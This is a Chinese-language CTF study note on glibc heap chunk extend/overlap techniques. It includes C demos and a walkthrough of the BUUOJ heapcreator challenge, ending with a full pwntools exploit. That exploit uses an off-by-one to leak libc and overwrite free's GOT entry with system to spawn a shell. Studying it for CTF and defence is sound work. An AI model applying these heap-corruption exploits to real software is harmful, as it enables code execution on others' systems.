## 基础学习
### 源码前节


在说这个专题之前我们现在需要知道相邻之间的chunk的如何获得各自相邻的chunk的信息的，以及如何进行合并的，下面看源码讲解：

定义了我们如何获得某个chunk的大小的
第一种形式是没忽略掩码
第二种是忽略了掩码了
```go
/* Get size, ignoring use bits */
#define chunksize(p) (chunksize_nomask(p) & ~(SIZE_BITS))

/* Like chunksize, but do not mask SIZE_BITS.  */
#define chunksize_nomask(p) ((p)->mchunk_size)
```

这个是定义了如何获取下一个chunk的chunk的大小的，它是当前的chunk的地址加上当前chunk的size的大小的，这样我们就得到了下一个chunk的地址了
```go
/* Ptr to next physical malloc_chunk. */
#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))

```

下面是定义了我们如何获得前一个chunk的大小和地址的，
即通过 malloc_chunk->prev_size 获取前一块大小，然后用当前chunk的地址减去当前chunk的大小
这样就得到了前一个chunk的地址了
```go
/* Size of the chunk below P.  Only valid if prev_inuse (P).  */
#define prev_size(p) ((p)->mchunk_prev_size)

/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */
#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))

```

这是定义了如何确定当前的chunk的insue的状态值，
是这样的：如果上一个chunk的是闲置的，我们就填写上一个chunk的大小，如果上一个的chunk不是闲置的我们就将本chunk的空间给上一个chunk的空间用，这样是为了节省空间。
```go
#define inuse(p)
    ((((mchunkptr)(((char *) (p)) + chunksize(p)))->mchunk_size) & PREV_INUSE)

```
我们可以通过这些定义去造成漏洞

---
### 对fastbin进行extend


```c
int main(void)
{
    void *ptr,*ptr1;

    ptr=malloc(0x10);//分配第一个0x10的chunk
    malloc(0x10);//分配第二个0x10的chunk

    *(long long *)((long long)ptr-0x8)=0x41;// 修改第一个块的size域

    free(ptr);
    ptr1=malloc(0x30);// 实现 extend，控制了第二个块的内容
    return 0;
}

```

当申请完之后就是这样的
![[Pasted image 20250419223435.png]]
![[Pasted image 20250419223559.png]]

然后进行将chunk1的pre_size的大小进行更改，更改后的值是可以覆盖两个chunk的。

![[Pasted image 20250419223815.png]]
我们可以看到我们的有个free的chunk为0x41的chunk在bins里面，现在我们再申请出来，
![[Pasted image 20250419224008.png]]
就覆盖了之前的chunk了

---
### 对smallbin进行extend


```go
int main()
{
    void *ptr,*ptr1;

    ptr=malloc(0x80);//分配第一个 0x80 的chunk1
    malloc(0x10); //分配第二个 0x10 的chunk2
    malloc(0x10); //防止与top chunk合并的chunk3

    *(int *)((int)ptr-0x8)=0xb1;
    free(ptr);
    ptr1=malloc(0xa0);
}

```

这是申请完三个chunk的时候
![[Pasted image 20250419224404.png]]

这是修改完ptr的指针的大小的时候，在堆的空间还能看见b1修改的大小
![[Pasted image 20250419224643.png]]

我们可以看到我们现在是申请到了我们原本修改到的地址了
![[Pasted image 20250419224857.png]]


---
### 通过extend进行向后的overlapping


```c
int main()
{
    void *ptr,*ptr1;

    ptr=malloc(0x10);//分配第1个 0x80 的chunk1
    malloc(0x10); //分配第2个 0x10 的chunk2
    malloc(0x10); //分配第3个 0x10 的chunk3
    malloc(0x10); //分配第4个 0x10 的chunk4    
    *(int *)((int)ptr-0x8)=0x61;
    free(ptr);
    ptr1=malloc(0x50);
}

```

![[Pasted image 20250419225516.png]]

将第一个 chunk size 修改为 0x61 ，然后 free 第一个堆块，前三个的chunk都会被当做一个整体放入到 fastbin 当中，然后再malloc
![[Pasted image 20250419225657.png]]


---
### 通过extend进行向前的overlapping

这个与上一个不同，这个向前合并需要设置当前chunk的pre_insue位与size符合合并后的大小和状态


![[Pasted image 20250419230241.png]]


![[Pasted image 20250419230228.png]]、

我们在修改完pre_insue和size的时候我们们可以看到下面的大小
要记得我们需要将pre_insue的状态改为0这样就代表我们的前面chunk的状态是闲置的，
还有要将我们需要pre_size的大小改为前面的chunk的大小的总和。
![[Pasted image 20250419230355.png]]


---

## 实战一

题目网址[https://buuoj.cn/challenges#hitcontraining_heapcreator](https://buuoj.cn/challenges#hitcontraining_heapcreator)

![[Pasted image 20250419231120.png]]

relro没开满，可以改got表。

![[Pasted image 20250419231337.png]]

create函数
在create建立的时候会根据自己的结构体自己建立一个0x20的大小，同时再建立想要申请的chunk
如下图：==自动生成的结构体是用来存储size和content指针的==

![[Pasted image 20250420162353.png]]

![[Pasted image 20250419231442.png]]

edit函数，存在一个off_by_one漏洞
![[Pasted image 20250419231520.png]]

show函数，展示size的大小，还有content的内容，后续可以用来泄露libc
![[Pasted image 20250419231530.png]]

delete函数，不存在什么漏洞，uaf也没有，free的指针清零了。
![[Pasted image 20250419231541.png]]

这题的思路是这样的，我们通过将extend向后overlapping，然后覆盖后修改内容内的


我们可以看到，free(1)之后的chunk的bins如下。
0x20的地址是指我们给heaparray申请的用来存储size和content_ptr的指针的。我们等会会看看等overlapping之后的chunk的对应地址是怎么样的。
![[Pasted image 20250420162703.png]]

我们可以看到，struct的结构在红色框内，黄色框内是conten_ptr的指针，绿色框内是我们申请成功的0x41,当我们free一块我们申请的content的时候，我们的free函数就会跳转到content_ptr去执行，所以我们将content_ptr的指针改成free的got用来泄露libc，泄露完libc之后我们就改free的got为system的真实地址。
![[Pasted image 20250420163321.png]]

![[Pasted image 20250420163801.png]]

尽管我们能看到的got没改，是因为我们改的是got表所指向的真实地址。
现在真是地址已经改为system的真实地址了
![[Pasted image 20250420163935.png]]

然后我们的system现在还缺参数，我们现在需要找个chunk里面的content内容填上/bin/sh\x00然后我们再free这块chunk的时候我们就可以调用system就把chunk的内容当成参数了。

```c
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : MrSkYe
# @Email   : skye231@foxmail.com
# @File    : heapcreator.py
from pwn import *
context.log_level = 'debug'
p = process("./heapcreator")
elf = ELF("./heapcreator")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def create(size,context):
	p.recvuntil("choice :")
	p.sendline("1")
	p.recvuntil("Heap : ")
	p.sendline(str(size))
	p.recvuntil("heap:")
	p.send(context)
def edit(id,context):
	p.recvuntil("choice :")
	p.sendline("2")
	p.recvuntil("Index :")
	p.sendline(str(id))
	p.recvuntil("heap :")
	p.send(context)
def show(id):
	p.recvuntil("choice :")
	p.sendline("3")
	p.recvuntil("Index :")
	p.sendline(str(id))
def free(id):
	p.recvuntil("choice :")
	p.sendline("4")
	p.recvuntil("Index :")
	p.sendline(str(id))
def exit():
	p.recvuntil("choice :")
	p.sendline("5")

# off-by-one
create(0x18,'a'*0x10)#0
create(0x10,'b'*0x10)#1
edit(0,"/bin/sh\x00".ljust(0x18,'a') + "\x41")
free(1)

# leak libc
free_got = elf.got['free']
create(0x30,'a'*0x18+p64(0x21)+p64(0x30)+p64(free_got))
show(1)
p.recvuntil("Content : ")

free_addr = u64(p.recv(6).ljust(8,'\x00'))
log.info("free_addr:"+hex(free_addr))
libc_base = free_addr - libc.symbols['free']
log.info("libc_base:"+hex(libc_base))
system = libc_base + libc.symbols['system']
log.info("system:"+hex(system))

edit(1,p64(system))
#gdb.attach(p)
free(0)

p.interactive()

```